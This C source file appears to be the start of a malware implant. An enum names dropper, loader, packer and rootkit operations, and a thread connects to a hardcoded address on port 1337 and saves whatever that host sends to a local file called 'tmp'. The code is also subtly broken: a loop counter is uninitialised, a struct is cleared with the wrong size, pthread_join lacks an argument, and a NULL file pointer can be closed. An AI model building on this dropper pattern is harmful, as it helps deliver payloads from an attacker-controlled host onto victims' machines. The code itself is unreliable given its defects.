#include "common_header.h"

typedef enum OptType {
	FILETRANS,
	LOAD,
	DROP,
	PACK,
	ROOTK,
}OptType;

typedef struct _ThreadVars {
	int tid;
	int sock;
	struct sockaddr_in pdr;
	void *(*thread_func)(int type, void *arg);
	OptType op;
	struct list_head lh;
}ThreadVars;

int getSkt(ThreadVars *tv, const char *ip, uint16_t port) {
	int i, st = -1;
	int fd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in *pdr = &(tv->pdr);

	if (fd < 0) {
		perror("[-] socket");
		goto err;
	}

	bzero(pdr, sizeof(struct sockaddr));

	pdr->sin_family = AF_INET;
	pdr->sin_addr.s_addr = inet_addr(ip);
	pdr->sin_port = htons(port);

	for (; i < 5; i++) {
		st = connect(fd, (struct sockaddr*)pdr, sizeof(struct sockaddr));
		if (0 <= st) break;
		sleep(1);
	}
	if (0 > st) {
		perror("[-] connect");
		goto err;
	}

	tv->sock = fd;

	return SUCCESS;		
err:
	return FAILURE;
}

void freeSkt(ThreadVars *tv) {
	if (NULL != tv) {
		close(tv->sock);
		if (tv->thread_func) {
			tv->thread_func = NULL;
		}
		bzero(tv, sizeof(tv));
		free(tv);
		tv = NULL;
	}
}

void * file_trans(void *args) {

	ThreadVars *tv = args;
	if (FAILURE ==  getSkt(tv, "192.168.101.45", 1337)) {
		perror("getSkt");
		return NULL;
	}

	int i;
	printf("hello file_trans\n");

	FILE *fp = fopen("tmp", "w+");
	if (NULL == fp) {
		goto err;
	}

	uint8_t buf[1024] = {0};
	int cnt = 0, res = -1;

	// fread loop
	while (1) {
		res = read(tv->sock, buf, 1024);
		cnt = fwrite(buf, 1, res, fp);
		printf("%d %d\n", res, cnt);
		if (cnt <= 0) break;
	}

err:
	fclose(fp);
	freeSkt(tv);
	return NULL;
}

int main() {
	pthread_t tid;
	int i;

	int op = 0;

	ThreadVars *tv = malloc(sizeof(ThreadVars));
	if (NULL == tv) {
		perror("malloc");
		exit(0);
	}

	pthread_create(&tid, NULL, file_trans, tv);

	//pthread_detach(tid);

	pthread_join(tid);

	printf("main thread quit\n");

	return 0;
}
